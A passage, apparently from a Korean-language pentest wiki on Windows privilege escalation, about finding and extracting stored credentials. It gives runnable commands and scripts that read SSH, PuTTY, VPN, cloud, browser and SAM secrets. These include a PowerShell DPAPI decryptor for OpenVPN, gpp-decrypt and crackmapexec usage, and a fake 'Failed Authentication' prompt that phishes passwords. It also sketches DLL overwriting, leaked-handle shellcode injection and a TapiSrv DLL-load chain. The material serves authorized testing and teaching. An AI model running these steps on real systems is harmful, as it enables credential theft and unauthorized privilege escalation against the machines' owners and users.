일반적으로 `server.config.yaml`이라는 이름을 사용하는 Velociraptor 서버 구성에는 내부 CA의 `CA.private_key`가 포함될 수 있습니다. 권한이 낮은 사용자가 해당 키를 읽을 수 있다면 API 클라이언트 인증서를 발급할 수도 있습니다. 이것이 더 높은 권한으로 이어지는지는 서버의 사용자 역할, API 접근 가능 여부, 서버 또는 대상 에이전트가 실행되는 ID에 따라 달라집니다. 클라이언트 구성에는 다른 자료가 포함됩니다. 클라이언트 구성을 찾았다고 해서 서버 CA에 접근할 수 있음이 입증되지는 않습니다. 일부 배포 환경은 CA 개인 키를 오프라인에 보관하므로, 읽을 수 있는 서버 구성에도 서명 키가 없을 수 있습니다.

Windows 서버에서는 설치 디렉터리에 있는 **서버** 구성과 보호된 백업 사본의 ACL을 확인하세요. 가능한 위치 중 하나는 `%ProgramFiles%\VelociraptorServer\server.config.yaml`입니다. 경로가 다르면 서비스에 구성된 경로를 사용하세요. 현재 ID로 파일을 읽을 수 있는지, `CA.private_key`가 실제로 포함되어 있는지 확인하세요. 로그나 열거 결과에 개인 키를 출력하지 마세요. 벤더의 `config api_client` 워크플로는 CA 키를 사용해 클라이언트 인증서를 발급하지만, 서버 측에서 유효한 역할도 필요합니다. 역할을 만들거나 변경하려면 데이터 저장소 쓰기 권한 또는 재시작이 필요할 수 있습니다. 이러한 쓰기 작업을 할 수 없어도 기존의 권한 있는 서버 ID를 통해 접근할 수 있습니다. 실행 권한이 있는 API 쿼리는 관련 서버 또는 에이전트 컨텍스트에서 실행되며, 높은 권한을 가질 수 있습니다.

제한적인 ACL로 서버 구성과 백업을 보호하고, 가능한 경우 CA 서명 키를 오프라인에 보관하며, API 역할과 리스너 접근을 제한하세요. [Velociraptor API 문서](https://docs.velociraptor.app/docs/server_automation/server_api/)와 [보안 구성 지침](https://docs.velociraptor.app/docs/deployment/security/)을 참조하세요.

### PuTTY 자격 증명

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY는 별도의 세션 관리자입니다. 기본 암호화 저장소는 `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`에 있을 수 있으며, 내보낸 세션 백업 파일은 `sessions-backup.dat`라는 이름으로 다른 위치에 저장될 수 있습니다. [SolarWinds' export guide](https://thwack.solarwinds.com/discussion/comment/115591)에 따르면 내보낸 파일은 암호로 암호화되며 세션, 키, 스크립트, 태그 및 관계 정보를 포함할 수 있습니다. [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)에서는 기본 저장소 위치를 확인할 수 있습니다. 먼저 파일 권한과 경로를 확인하세요. 두 파일 중 하나를 발견하더라도 암호를 알 수 있는 것은 아니며, 저장된 자격 증명이 여전히 유효하거나 더 높은 권한을 가진다는 증거도 되지 않습니다.

### PuTTY SSH 호스트 키

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### 레지스트리의 SSH 키

SSH 개인 키는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys`에 저장될 수 있으므로, 그 안에 흥미로운 항목이 있는지 확인해야 합니다:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

해당 경로에서 항목을 찾으면 저장된 SSH 키일 가능성이 높습니다. 암호화되어 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)을 사용하면 쉽게 복호화할 수 있습니다.\
이 기법에 대한 자세한 내용은 여기를 참고하세요: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` 서비스가 실행되고 있지 않고 부팅 시 자동으로 시작되도록 설정하려면 다음을 실행하세요:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> 이 기법은 더 이상 유효하지 않은 것 같습니다. ssh 키를 몇 개 생성해 `ssh-add`로 추가한 뒤 ssh를 통해 머신에 로그인해 보았습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys는 존재하지 않으며, procmon으로도 비대칭 키 인증 중 `dpapi.dll`이 사용되는 것을 확인할 수 없었습니다.

### 무인 설치 파일

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

**metasploit**을 사용해 다음 파일도 검색할 수 있습니다: _post/windows/gather/enum_unattend_

예시 콘텐츠:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM 백업

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Readable Windows Imaging (`.wim`) 백업 파일에도 오프라인 `SAM`, `SECURITY`, `SYSTEM` 하이브가 포함될 수 있습니다. 로컬에서 접근할 수 있는 백업 또는 이미지 디렉터리를 우선 확인하고, 이미지에서 무엇이든 추출하기 전에 **멤버 이름**을 확인하세요. `.wim` 파일명만으로 하이브가 노출되었다고 단정할 수는 없으며, 일반적인 `install.wim`, `boot.wim`, 복구 이미지는 흔한 오인 사례입니다. SMB 공유는 별도의 접근 경로이므로 해당 공유가 범위에 포함되는 경우에만 확인해야 합니다. Microsoft의 [Windows 이미지 지침](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) 및 [레지스트리 하이브 파일 참조](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)를 참조하세요.

### 클라우드 자격 증명

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml**이라는 파일을 검색합니다.

### Cached GPP Password

이전에는 Group Policy Preferences (GPP)를 통해 여러 컴퓨터에 사용자 지정 로컬 관리자 계정을 배포할 수 있는 기능이 있었습니다. 하지만 이 방법에는 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPO)는 모든 도메인 사용자가 액세스할 수 있었습니다. 둘째, 공개적으로 문서화된 기본 키를 사용해 AES256으로 암호화된 이 GPP의 비밀번호는 인증된 사용자라면 누구나 복호화할 수 있었습니다. 사용자가 상승된 권한을 얻을 수 있는 심각한 위험이 있었습니다.

이 위험을 완화하기 위해 비어 있지 않은 "cpassword" 필드가 포함된 로컬 캐시 GPP 파일을 검색하는 함수가 개발되었습니다. 이러한 파일을 찾으면 함수는 비밀번호를 복호화하고 사용자 지정 PowerShell 객체를 반환합니다. 이 객체에는 취약점을 식별하고 해결하는 데 도움이 되도록 GPP 세부 정보와 파일 위치가 포함됩니다.

다음 경로에서 파일을 검색합니다.

`C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista 이전)_

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexec를 사용해 비밀번호 획득:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

자격 증명이 포함된 web.config 예:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot의 백업 아카이브

서비스되는 webroot에 직접 저장된 오래된 ZIP 백업에는 이전 구성 파일과 재사용 가능한 자격 증명이 노출될 수 있습니다. 노출로 간주하기 전에 사이트에 구성된 실제 경로와 해당 아카이브에 HTTP로 실제 접근할 수 있는지 확인하세요. 기본 `C:\inetpub\wwwroot` 경로는 후보일 뿐입니다. 간단한 로컬 목록 조회로 아카이브를 열지 않고도 파일 이름과 크기를 확인할 수 있습니다:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

아카이브 이름만으로 그 안에 비밀 정보가 들어 있거나 복구한 자격 증명으로 더 높은 권한을 얻을 수 있다고 단정할 수는 없습니다.

### OpenVPN 자격 증명

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### 로그

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 자격 증명 요청

사용자가 알고 있을 것 같다면 언제든지 **사용자 본인의 자격 증명이나 다른 사용자의 자격 증명을 입력해 달라고 요청할 수 있습니다** (클라이언트에게 직접 **자격 증명**을 **요청하는 것**은 정말 **위험합니다**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **자격 증명이 포함될 수 있는 파일 이름**

과거에 **암호**가 **평문** 또는 **Base64**로 포함되어 있었던 것으로 알려진 파일들

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 데이터베이스는 일반적으로 `.psafe3` 확장자를 사용합니다. 일치하는 파일 이름은 암호화된 볼트 후보로 간주하세요. 파일이 있다는 사실만으로 내용을 읽거나, 잠금을 해제하거나, 저장된 자격 증명을 사용할 수 있다는 뜻은 아닙니다. 이러한 파일이 어디에 저장되어 있는지 검토할 때는 접근 가능한 사용자 프로필과 구성된 파일 공유 루트를 확인하세요.

읽을 수 있는 KeePass `.kdbx` 파일도 암호화된 볼트의 단서일 뿐입니다. 잠금을 해제하려면 실제 마스터 비밀번호와 구성된 키 파일 또는 계정 인증 요소가 필요합니다. 승인된 검토 중 항목에서 LM:NT 해시 쌍을 발견하면 [pass-the-hash](../ntlm/README.md#pass-the-hash)를 고려하기 전에 지정된 계정이 맞는지, NT 해시가 유효하고 대상의 NTLM 서비스에서 허용되는지 확인하세요. 볼트 항목만으로 Administrator 또는 SYSTEM 권한을 얻을 수는 없습니다. 원격 서비스 접근, 계정 권한, 별도의 서비스 실행 단계도 모두 충족되어야 합니다. 인벤토리에는 볼트 경로와 읽기 가능 여부를 기록하고, 데이터베이스나 저장된 자격 증명은 출력하지 마세요.

제안된 파일을 모두 검색하세요:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### 휴지통의 자격 증명

접근 가능한 휴지통 항목에서 삭제된 백업과 구성 아카이브는 물론, 이름에 자격 증명이 명시된 파일도 확인하세요. 유용한 `.7z`, `.zip` 또는 `.rar` 백업은 몇 달 전에 만들어졌고 평범한 파일명을 사용할 수도 있습니다. Windows는 `$I` 레코드에 원래 경로와 삭제 시간을 저장하고, 삭제된 파일은 짝을 이루는 `$R` 항목으로 저장합니다. 아카이브를 열기 전에 메타데이터와 현재 계정의 읽기 권한을 확인하세요. 표시 여부는 볼륨, 사용자 SID, 파일 권한에 따라 달라지므로 목록이 비어 있다고 해서 복구 가능한 백업이 없다는 뜻은 아닙니다. 아카이브 이름은 검토 후보일 뿐, 유효한 비밀 정보가 들어 있다는 증거는 아닙니다.

접근 가능한 삭제된 `.pfx` 파일은 **코드 서명**의 단서가 될 수도 있습니다. 접근 가능한 개인 키가 들어 있다면 해당 키로 변경된 PowerShell 스크립트에 서명할 수 있습니다. [PowerShell에는 개인 키가 있는 코드 서명 인증서가 필요하며](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), [AppLocker 게시자 규칙은 서명자의 ID와 규칙 범위를 평가합니다](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). 다른 계정으로 실행하려면 현재 계정에 정확한 스크립트를 수정할 권한이 있어야 하고, 적용되는 규칙이 해당 스크립트와 대상 계정에 대해 변경된 서명을 허용해야 하며, 예약된 작업이나 다른 상위 권한 프로세스가 실제로 해당 스크립트를 실행해야 합니다. `.pfx` 파일명, 인증서 주체 또는 쓰기 가능한 스크립트만으로는 이 실행 경로가 성립한다고 볼 수 없습니다. 개인 키 자료를 열거나 작업을 실행하기 전에 메타데이터, ACL, 정책, 예약된 명령을 검토하세요.

또한 접근 가능한 메시징 클라이언트의 프로필 데이터베이스, 메모, 수신 파일에서 자격 증명 단서를 확인하세요. BitLocker 복구 키 내보내기는 HTML 또는 TXT 파일로 저장될 수 있으며, 이름이 붙은 백업 아카이브 안에 들어 있는 경우도 있습니다. 이러한 자료를 통해 오래된 백업이 들어 있는 별도의 암호화 데이터 볼륨에 접근할 수 있습니다. 접근 권한이 있는 경우에만 해당 볼륨과 아카이브를 확인하세요. 백업에 `NTDS.dit`가 포함되어 있다면 오프라인 도메인 자격 증명 복구에는 [백업 및 권한 있는 그룹 워크플로](../active-directory-methodology/privileged-groups-and-token-privileges.md)에 설명된 대로 일치하는 `SYSTEM` 하이브도 필요합니다. 파일명이나 잠긴 볼륨만으로 사용 가능한 복구 키 또는 도메인 백업이 있다고 단정할 수는 없습니다.

여러 프로그램에 저장된 **비밀번호를 복구**하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 레지스트리 내부

**자격 증명이 있을 수 있는 기타 레지스트리 키**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**레지스트리에서 openssh 키 추출.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

**Chrome, Edge 또는 Firefox**의 비밀번호가 저장된 db가 있는지 확인해야 합니다.\
또한 브라우저의 기록, 북마크, 즐겨찾기도 확인하세요. 여기에 **비밀번호가 저장되어 있을 수도 있습니다.**

현재 사용자의 일반적인 Edge **Default** 프로필에서 `Login Data`는 `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`에 있으며, `Local State`는 상위 `User Data` 디렉터리에 있습니다. [Microsoft에서 기본 프로필 위치를 문서화하고 있습니다](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars). 다른 프로필이나 `UserDataDir` 정책에 따라 위치가 달라질 수 있습니다. 파일이 있다는 사실은 자격 증명 저장소를 확인해 볼 단서일 뿐입니다. 파일을 읽을 수 있는지, 해당 사용자의 DPAPI 컨텍스트나 다른 승인된 키 자료를 사용할 수 있는지, 저장된 로그인이 더 높은 권한의 계정에 속하는지 확인하세요. 경로만 열거할 때 데이터베이스를 열거나 복호화된 비밀번호를 출력할 필요는 없습니다.

Firefox의 경우, [Mozilla 문서에 따르면](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) 프로필의 `key4.db`와 `logins.json`은 각각 키 파일과 암호화된 로그인 파일입니다. 두 파일이 존재한다는 사실은 확인해 볼 단서일 뿐입니다. 두 파일을 모두 읽을 수 있는지, 저장된 항목이 있는지, Primary Password가 키를 보호하는지 확인한 뒤 자격 증명을 사용할 수 있다고 판단하세요. 복구한 자격 증명이 도메인 계정에 속한다면 해당 계정의 유효 그룹 제어 권한과 그룹의 [LAPS 비밀번호 읽기 또는 복호화 권한](../active-directory-methodology/laps.md)을 각각 검토하세요. 브라우저 아티팩트만으로는 관리자 권한 상승 경로가 입증되지 않습니다.

브라우저에서 비밀번호를 추출하는 도구:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**은 Windows 운영 체제에 내장된 기술로, 서로 다른 언어로 작성된 소프트웨어 구성 요소 간의 **상호 통신**을 가능하게 합니다. 각 COM 구성 요소는 **클래스 ID (CLSID)**로 식별되며, 하나 이상의 인터페이스를 통해 기능을 제공합니다. 각 인터페이스는 인터페이스 ID (IID)로 식별됩니다.

COM 클래스와 인터페이스는 각각 레지스트리의 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface** 아래에 정의됩니다. 이 레지스트리는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes**를 병합하여 생성되며, 그 결과가 **HKEY\CLASSES\ROOT**입니다.

이 레지스트리의 CLSID 내에서 하위 레지스트리인 **InProcServer32**를 찾을 수 있습니다. 여기에는 **DLL**을 가리키는 **기본값**과 **ThreadingModel**이라는 값이 포함됩니다. **ThreadingModel**은 **Apartment** (단일 스레드), **Free** (다중 스레드), **Both** (단일 또는 다중 스레드) 또는 **Neutral** (스레드 중립)일 수 있습니다.

![브라우저 기록 - COM DLL Overwriting: 이 레지스트리의 CLSID 내에서 하위 레지스트리인 InProcServer32를 찾을 수 있습니다. 여기에는 DLL을 가리키는 기본값과 다음 값이 포함됩니다...](<../../images/image (729).png>)

기본적으로, 실행될 **DLL 중 하나라도 덮어쓸 수 있다면**, 해당 DLL이 다른 사용자에 의해 실행될 경우 **권한을 상승**시킬 수 있습니다.

공격자가 지속성 메커니즘으로 COM Hijacking을 사용하는 방법을 알아보려면 다음을 확인하세요:

{{#ref}}
com-hijacking.md
{{#endref}}

### **파일 및 레지스트리에서 일반적인 비밀번호 검색**

**파일 내용 검색**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**특정 파일 이름을 가진 파일 검색**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**레지스트리에서 키 이름과 비밀번호 검색**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### 비밀번호를 검색하는 도구

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **은 msf** 플러그인입니다. 이 플러그인은 피해자 시스템에서 자격 증명을 검색하는 모든 Metasploit POST 모듈을 **자동으로 실행**하도록 제가 만들었습니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 이 페이지에서 언급한 비밀번호가 포함된 모든 파일을 자동으로 검색합니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne)는 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)는 데이터를 평문으로 저장하는 여러 도구(PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP)의 **세션**, **사용자 이름**, **비밀번호**를 검색합니다.

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## 유출된 핸들

**SYSTEM으로 실행 중인 프로세스가** `OpenProcess()`를 사용해 **모든 권한으로 새 프로세스를 열었다고** 가정해 보겠습니다. 같은 프로세스가 **주 프로세스의 열린 핸드를 모두 상속하는 낮은 권한의 새 프로세스도** `CreateProcess()`를 사용해 **생성합니다**.\
그런 다음 **낮은 권한의 프로세스에 대한 모든 권한을 가지고 있다면**, `OpenProcess()`로 열린 **권한이 높은 프로세스의 핸들**을 가져와 **shellcode를 주입할 수 있습니다**.\
[이 취약점을 **탐지하고 악용하는 방법**에 대한 자세한 내용은 이 예제를 참고하세요.](leaked-handle-exploitation.md)\
[서로 다른 권한 수준으로 상속된 프로세스와 스레드의 열린 핸들을 더 많이 테스트하고 악용하는 방법(모든 권한만 해당하는 것은 아님)을 자세히 설명한 **다른 게시물은 여기에서 확인하세요**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**파이프**라고 하는 공유 메모리 세그먼트를 사용하면 프로세스 간 통신과 데이터 전송이 가능합니다.

Windows에는 **Named Pipes**라는 기능이 있어 서로 관련 없는 프로세스끼리도 네트워크가 달라도 데이터를 공유할 수 있습니다. 이는 **named pipe server**와 **named pipe client**라는 역할로 구성되는 클라이언트/서버 아키텍처와 비슷합니다.

**클라이언트**가 파이프를 통해 데이터를 보내면, 파이프를 설정한 **서버**는 필요한 **SeImpersonate** 권한이 있는 경우 **클라이언트의 신원을 가장할 수 있습니다**. 가장할 수 있는 파이프를 통해 통신하는 **권한 높은 프로세스**를 찾으면, 해당 프로세스가 직접 설정한 파이프와 상호작용할 때 그 신원을 가장하여 **더 높은 권한을 얻을 수 있습니다**. 이 공격의 수행 방법은 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)에서 확인할 수 있습니다.

또한 다음 도구를 사용하면 **burp 같은 도구로 named pipe 통신을 가로챌 수 있습니다:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구를 사용하면 privesc 대상을 찾기 위해 모든 pipe를 나열하고 확인할 수 있습니다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

서버 모드의 Telephony 서비스(TapiSrv)는 `\\pipe\\tapsrv` (MS-TRP)를 노출합니다. 원격 인증 클라이언트는 mailslot 기반 비동기 이벤트 경로를 악용해 `ClientAttach`를 이용하여 `NETWORK SERVICE`가 쓸 수 있는 기존 파일에 임의의 **4바이트 쓰기**를 수행한 다음, Telephony 관리자 권한을 얻고 서비스로 임의의 DLL을 로드할 수 있습니다. 전체 과정은 다음과 같습니다.

- `pszDomainUser`를 쓰기 가능한 기존 경로로 설정하여 `ClientAttach`를 호출합니다. 그러면 서비스가 `CreateFileW(..., OPEN_EXISTING)`으로 해당 파일을 열고 비동기 이벤트 쓰기에 사용합니다.
- 각 이벤트는 `Initialize`의 공격자 제어 `InitContext`를 해당 핸들에 씁니다. `LRegisterRequestRecipient` (`Req_Func 61`)로 line app을 등록하고, `TRequestMakeCall` (`Req_Func 121`)을 트리거한 뒤, `GetAsyncEvents` (`Req_Func 0`)로 가져옵니다. 그런 다음 등록을 해제하고 종료하여 동일한 쓰기를 결정적으로 반복합니다.
- `C:\Windows\TAPI\tsec.ini`의 `[TapiAdministrators]`에 자신을 추가하고 다시 연결한 다음, 임의의 DLL 경로로 `GetUIDllName`을 호출하여 `NETWORK SERVICE` 권한으로 `TSPI_providerUIIdentify`를 실행합니다.

자세한 내용:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## 기타

### Windows에서 실행될 수 있는 파일 확장자

**[https://filesec.io/](https://filesec.io/)** 페이지를 확인하세요.

### Markdown 렌더러를 통한 Protocol handler / ShellExecute 악용

`ShellExecuteExW`로 전달되는 클릭 가능한 Markdown 링크는 위험한 URI handler(`file:`, `ms-appinstaller:` 또는 등록된 모든 scheme)를 실행하고 현재 사용자 권한으로 공격자가 제어하는 파일을 실행할 수 있습니다. 자세한 내용:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **비밀번호가 포함된 명령줄 모니터링**

사용자 권한으로 shell을 획득하면, **명령줄에 자격 증명을 전달하는** 예약 작업이나 기타 프로세스가 실행 중일 수 있습니다. 아래 스크립트는 2초마다 프로세스 명령줄을 캡처하고 이전 상태와 현재 상태를 비교해 변경된 내용을 출력합니다.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## 프로세스에서 비밀번호 탈취하기

## 낮은 권한의 사용자에서 NT\AUTHORITY SYSTEM으로 (CVE-2019-1388) / UAC Bypass

콘솔 또는 RDP를 통해 그래픽 인터페이스에 액세스할 수 있고 UAC가 활성화되어 있다면, 일부 Microsoft Windows 버전에서는 권한이 없는 사용자로 터미널이나 "NT\AUTHORITY SYSTEM"과 같은 다른 프로세스를 실행할 수 있습니다.

